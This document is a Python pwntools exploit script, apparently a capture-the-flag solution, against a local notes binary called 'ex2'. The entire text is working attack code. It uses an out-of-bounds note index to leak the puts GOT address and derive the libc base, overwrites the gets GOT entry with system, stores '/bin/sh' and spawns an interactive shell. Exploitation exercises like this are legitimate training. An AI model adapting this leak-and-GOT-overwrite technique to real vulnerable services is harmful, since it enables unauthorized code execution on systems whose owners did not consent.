from pwn import *

context.update(arch='amd64', os='linux')
target = process('./bin/ex2')


elf = ELF('./bin/ex2')

notes_addr = elf.symbols['NOTES']
puts_got = elf.got['puts']
gets_got = elf.got['gets']

diff = puts_got - notes_addr
idx = diff // 16

target.recvuntil(b'3. Exit\n')
target.sendline(str(2).encode())

target.sendline(str(idx).encode())

target.recvuntil(b']: ')
leak_data = target.recvline().strip()
leak_val = u64(leak_data.ljust(8, b'\x00'))

libc = elf.libc
libc.address = leak_val - libc.symbols['puts']
system_addr = libc.symbols['system']

diff_gets = gets_got - notes_addr
idx_gets = diff_gets // 16


start_addr = notes_addr + (idx_gets * 16)

payload_entries = []
current_offset = 0


got_map = {v: k for k, v in elf.got.items()}

for _ in range(4):
        current_addr = start_addr + current_offset

        if current_addr == gets_got:
            payload_entries.append(system_addr)
        elif current_addr in got_map:
            name = got_map[current_addr]
            addr = libc.symbols[name]
            payload_entries.append(addr)
        else:
            payload_entries.append(0xdeadbeef)

        current_offset += 8


payload = b''.join(p64(e) for e in payload_entries)



target.recvuntil(b'3. Exit\n')
target.sendline(str(1).encode())

target.sendline(str(0).encode())

target.sendline(b'/bin/sh')



target.recvuntil(b'3. Exit\n')
target.sendline(str(1).encode())

target.sendline(str(idx_gets).encode())

target.sendline(payload)



target.recvuntil(b'3. Exit\n')
target.sendline(str(1).encode())


target.sendline(str(0).encode())


target.interactive()
